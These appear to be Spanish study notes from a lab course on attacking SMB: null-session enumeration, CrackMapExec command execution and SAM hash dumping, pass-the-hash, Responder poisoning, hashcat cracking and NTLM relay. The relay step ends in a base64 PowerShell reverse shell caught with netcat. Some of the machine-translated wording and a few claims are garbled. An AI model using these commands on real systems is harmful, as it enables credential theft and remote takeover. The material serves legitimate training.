#Protocolo


**SMB** significa **Server Message Block**, es un **protocolo** de comunicación de red utilizado para compartir archivos, impresoras y otros recursos entre dispositivos de red. Es un protocolo propietario de **Microsoft** que se utiliza en sistemas operativos **Windows**.

**Samba**, por otro lado, es una implementación libre y de código abierto del **protocolo SMB**, que se utiliza principalmente en sistemas operativos basados en **Unix** y **Linux**. Samba proporciona una manera de compartir archivos y recursos entre dispositivos de red que ejecutan sistemas operativos diferentes, como Windows y Linux.

Aunque SMB y Samba comparten una funcionalidad similar, existen algunas diferencias notables. SMB es un protocolo propietario de Microsoft, mientras que Samba es un proyecto de software libre y de código abierto. Además, SMB es una implementación más completa y compleja del protocolo, mientras que Samba es una implementación más ligera y limitada.

---

A continuación, se os comparte el enlace correspondiente al proyecto de Github que utilizamos para desplegar un laboratorio de práctica con el que poder enumerar y explotar el servicio Samba:

- **Samba Authenticated RCE**: [https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494](https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494)


Por último, otra de las herramientas que utilizamos al final de la clase para enumerar el servicio Samba es ‘**Crackmapexec**‘. CrackMapExec (también conocido como CME) es una herramienta de prueba de penetración de línea de comandos que se utiliza para realizar auditorías de seguridad en entornos de Active Directory. CME se basa en las bibliotecas de Python ‘**impacket**‘ y es compatible con sistemas operativos Windows, Linux y macOS.

**CME** puede utilizarse para realizar diversas tareas de auditoría en entornos de **Active Directory**, como enumerar usuarios y grupos, buscar contraseñas débiles, detectar sistemas vulnerables y buscar vectores de ataque. Además, CME también puede utilizarse para ejecutar ataques de diccionario de contraseñas, ataques de **Pass-the-Hash** y para explotar vulnerabilidades conocidas en sistemas Windows. Asimismo, cuenta con una amplia variedad de módulos y opciones de configuración, lo que la convierte en una herramienta muy flexible para la auditoría de seguridad de entornos de Active Directory. La herramienta permite automatizar muchas de las tareas de auditoría comunes, lo que ahorra tiempo y aumenta la eficiencia del proceso de auditoría.

A continuación, os compartimos el enlace directo a la Wiki para que podáis instalar la herramienta:

- **CrackMapExec**: [https://wiki.porchetta.industries/getting-started/installation/installation-on-unix](https://wiki.porchetta.industries/getting-started/installation/installation-on-unix)

# Montar los datos de un smb a mi máquina

** **ADVERTENCIA**: LO QUE SE MONTA SON LOS ARCHIVOS REALES POR LO QUE SI BORRAS ALGO SE BORRARÁ TANBIEN DEL SMB ** 

Esto se hace para hacer un tree o trabajar.

```
mount -t cifs //127.0.0.1/myshare /mnt/mounted
```

Para desmontarlo

```
umount /mnt/mounted
```
# Pasos para explotar

## Enumeración

- Visualizar recursos compartidos y permisos con [[smbmap]] (ENUMERACIÓN) y [[smbclient]] (INTERACTUAR)
## Explotación


# POR ORGANIZAR
### LINUX
#### Autenticación Anónima

Si encontramos un servidor SMB que no requiere un nombre de usuario y contraseña o encontramos credenciales válidas, podemos obtener una lista de acciones, nombres de usuario, grupos, permisos, políticas, servicios, etc. La mayoría de las herramientas que interactúan con SMB permiten conectividad de sesión nula, incluyendo `smbclient`, `smbmap`, `rpcclient`, o `enum4linux`. Exploremos cómo podemos interactuar con recursos compartidos de archivos y RPC utilizando la autenticación nula.

#### Archivo Compartir

Usando `smbclient`, podemos mostrar una lista de las acciones del servidor con la opción `-L`, y usando la opción `-N`, lo decimos `smbclient` para usar la sesión nula.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` es otra herramienta que nos ayuda a enumerar los recursos compartidos de red y acceder a los permisos asociados. Una ventaja de `smbmap` es que proporciona una lista de permisos para cada carpeta compartida.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Usando `smbmap` con el `-r` o `-R` (recursiva) opción, uno puede navegar por los directorios:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

En el ejemplo anterior, los permisos se establecen en `READ` y `WRITE`, que se puede utilizar para cargar y descargar los archivos.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

#### Llamada de Procedimiento Remoto (RPC)

Podemos usar el `rpcclient` herramienta con una sesión nula para enumerar una estación de trabajo o Controlador de dominio.

El `rpcclient` tool nos ofrece muchos comandos diferentes para ejecutar funciones específicas en el servidor SMB para recopilar información o modificar atributos del servidor como un nombre de usuario. Podemos usar esto [hoja de trucos del Instituto SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) o revise la lista completa de todas estas funciones que se encuentran en el [página de manual](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) de la `rpcclient`.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` es otra utilidad que admite sesiones nulas, y utiliza `nmblookup`, `net`, `rpcclient`, y `smbclient` para automatizar alguna enumeración común de objetivos de SMB como:

- Grupo de trabajo/Nombre del dominio
- Información de los usuarios
- Información del sistema operativo
- Información de grupos
- Acciones Carpetas
- Información de política de contraseña

El [herramienta original](https://github.com/CiscoCXSecurity/enum4linux) fue escrito en Perl y [reescrito por Mark Lowe en Python](https://github.com/cddmp/enum4linux-ng).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```




### Windows

Los servidores SMB de Linux y Windows proporcionan diferentes rutas de ataque. Por lo general, solo tendremos acceso al sistema de archivos, privilegios de abuso o vulnerabilidades conocidas en un entorno Linux, como discutiremos más adelante en esta sección. Sin embargo, en Windows, la superficie de ataque es más significativa.

Al atacar un servidor SMB de Windows, nuestras acciones estarán limitadas por los privilegios que teníamos sobre el usuario que logramos comprometer. Si este usuario es Administrador o tiene privilegios específicos, podremos realizar operaciones como:

- Ejecución de Comando Remoto
- Extraer Hashes de la base de datos SAM
- Enumerar Usuarios Iniciados
- Pass-the-Hash (PTH)

Discutamos cómo podemos realizar tales operaciones. Además, aprenderemos cómo se puede abusar del protocolo SMB para recuperar el hash de un usuario como un método para escalar privilegios u obtener acceso a una red.

#### Ejecución Remota de Código (RCE)


[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) es una herramienta que nos permite ejecutar procesos en otros sistemas, completos con total interactividad para aplicaciones de consola, sin tener que instalar el software cliente manualmente. Funciona porque tiene una imagen de servicio de Windows dentro de su ejecutable. Toma este servicio y lo implementa en el recurso compartido admin$ (de forma predeterminada) en la máquina remota. Luego utiliza la interfaz DCE/RPC sobre SMB para acceder a la API de Windows Service Control Manager. A continuación, inicia el servicio PSExec en la máquina remota. El servicio PSExec crea entonces un [llamada tubería](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) eso puede enviar comandos al sistema.



#### CrackMapExec

Otra herramienta que podemos usar para ejecutar CMD o PowerShell es `CrackMapExec`. Una ventaja de `CrackMapExec` es la disponibilidad para ejecutar un comando en múltiples host a la vez. Para usarlo, necesitamos especificar el protocolo, `smb`, la dirección IP o el rango de direcciones IP, la opción `-u` para nombre de usuario, y `-p` para la contraseña y la opción `-x` para ejecutar comandos cmd o mayúsculas `-X` para ejecutar comandos de PowerShell.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Nota:** Si el`--exec-method` no está definido, CrackMapExec intentará ejecutar el método atexec, si falla puede intentar especificar el `--exec-method` smbexec.

#### Enumerar Usuarios Iniciados

Imagina que estamos en una red con múltiples máquinas. Algunos de ellos comparten la misma cuenta de administrador local. En este caso, podríamos usar `CrackMapExec` para enumerar usuarios registrados en todas las máquinas dentro de la misma red `10.10.110.17/24`, lo que acelera nuestro proceso de enumeración.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```


#### Extraer Hashes de la base de datos SAM

El Security Account Manager (SAM) es un archivo de base de datos que almacena las contraseñas de los usuarios. Se puede utilizar para autenticar usuarios locales y remotos. Si obtenemos privilegios administrativos en una máquina, podemos extraer los hashes de la base de datos SAM para diferentes propósitos:

- Autenticar como otro usuario.
- Cracking de contraseñas, si logramos descifrar la contraseña, podemos intentar reutilizar la contraseña para otros servicios o cuentas.
- Pase el Hash. Lo discutiremos más adelante en esta sección.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

#### Pass-the-Hash (PtH)

Si logramos obtener un hash NTLM de un usuario, y si no podemos descifrarlo, aún podemos usar el hash para autenticarse sobre SMB con una técnica llamada Pass-the-Hash (PtH). PtH permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM subyacente de la contraseña de un usuario en lugar de la contraseña de texto sin formato. Podemos usar un ataque PtH con cualquier `Impacket` herramienta, `SMBMap`, `CrackMapExec`, entre otras herramientas. Aquí hay un ejemplo de cómo funcionaría esto `CrackMapExec`:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```




#### Ataques de Autenticación Forzada

También podemos abusar del protocolo SMB creando un servidor SMB falso para capturar los usuarios [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

La herramienta más común para realizar tales operaciones es la `Responder`. [Respondedor](https://github.com/lgandx/Responder) es una herramienta envenenadora LLMNR, NBT-NS y MDNS con diferentes capacidades, una de ellas es la posibilidad de configurar servicios falsos, incluido SMB, para robar hashes NetNTLM v1/v2. En su configuración predeterminada, encontrará tráfico LLMNR y NBT-NS. Luego, responderá en nombre de los servidores que la víctima está buscando y capturará sus hashes NetNTLM.

Ilustremos un ejemplo para entender mejor cómo `Responder` obras. Imagine que creamos un servidor SMB falso utilizando la configuración predeterminada Responder, con el siguiente comando:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ responder -I <interface name>
```

Cuando un usuario o un sistema intenta realizar una Resolución de nombres (NR), una máquina realiza una serie de procedimientos para recuperar la dirección IP de un host por su nombre de host. En las máquinas con Windows, el procedimiento será aproximadamente el siguiente:

- Se requiere la dirección IP del recurso compartido del archivo de nombre de host.
- El archivo host local (C:\Windows\System32\Drivers\etc\hosts) se comprobará para obtener registros adecuados.
- Si no se encuentran registros, la máquina cambia a la caché DNS local, que realiza un seguimiento de los nombres resueltos recientemente.
- ¿No hay registro DNS local? Se enviará una consulta al servidor DNS que se ha configurado.
- Si todo lo demás falla, la máquina emitirá una consulta de multidifusión, solicitando la dirección IP del recurso compartido de archivos de otras máquinas de la red.

Supongamos que un usuario escribió mal el nombre de una carpeta compartida `\\mysharefoder\` en lugar de `\\mysharedfolder\`. En ese caso, todas las resoluciones de nombre fallarán porque el nombre no existe, y la máquina enviará una consulta de multidifusión a todos los dispositivos de la red, incluidos nosotros que ejecutamos nuestro servidor SMB falso. Esto es un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando tales consultas y falsificando respuestas, lo que lleva a la víctima a creer que los servidores maliciosos son confiables. Esta confianza se utiliza generalmente para robar credenciales.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Estas credenciales capturadas se pueden descifrar usando [hachís](https://hashcat.net/hashcat/) o retransmitido a un host remoto para completar la autenticación y hacerse pasar por el usuario.

Todos los hash guardados se encuentran en el directorio de registros de Responder (`/usr/share/responder/logs/`). Podemos copiar el hash a un archivo e intentar descifrarlo usando el módulo hashcat 5600.

**Nota:** Si observa múltiples hashes para una cuenta, esto se debe a que NTLMv2 utiliza un desafío del lado del cliente y del lado del servidor que se asigna al azar para cada interacción. Esto hace que los hashes resultantes que se envían se salen con una cadena aleatoria de números. Esta es la razón por la que los hashes no coinciden pero aún representan la misma contraseña.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

El hash NTLMv2 se agrietó. La contraseña es `P@ssword`. Si no podemos descifrar el hash, potencialmente podemos transmitir el hash capturado a otra máquina usando [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) o Respondedor [MultiRelay.p](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Veamos un ejemplo usando `impacket-ntlmrelayx`.

Primero, necesitamos establecer SMB para `OFF` en nuestro archivo de configuración del respondedor (`/etc/responder/Responder.conf`).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Luego ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support`, y la máquina de destino con la opción `-t`. Por defecto, `impacket-ntlmrelayx` volcará la base de datos SAM, pero podemos ejecutar comandos agregando la opción `-c`.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Podemos crear un shell inverso de PowerShell usando [https://www.revshells.com/](https://www.revshells.com/), establezca nuestra dirección IP de la máquina, puerto y la opción Powershell #3 (Base64).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica en nuestro servidor, envenenamos la respuesta y hacemos que ejecute nuestro comando para obtener un shell inverso.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```


